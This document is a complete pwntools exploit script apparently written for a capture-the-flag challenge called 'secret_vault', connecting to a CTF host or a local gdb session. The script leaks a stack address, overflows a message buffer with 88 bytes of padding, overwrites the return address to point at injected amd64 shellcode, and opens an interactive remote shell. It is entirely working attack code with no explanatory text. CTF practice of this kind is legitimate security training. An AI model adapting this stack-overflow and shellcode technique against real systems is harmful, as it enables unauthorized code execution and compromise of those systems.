#!/usr/bin/env python3
from pwn import remote, shellcraft, asm, args, gdb, p64, xor

if args.REMOTE:
    r = remote("vault.challs.olicyber.it", 10006)
else:
    r = gdb.debug("./secret_vault", gdbscript="""
    b *insert_secret+141
    continue""")

SHELLCODE = asm(shellcraft.amd64.linux.sh(), arch="x86_64")
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"messaggio:")
r.sendline(b'a'*64)
r.recvuntil(b' in ')
addr = p64(int(r.recvuntil(b'!').strip().decode().replace('!', ''), 16) + 96)
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"messaggio:")
PAYLOAD = b'a'*88 + addr + SHELLCODE
r.sendline(PAYLOAD)
r.recvuntil(b">")
r.sendline(b"3")
r.interactive()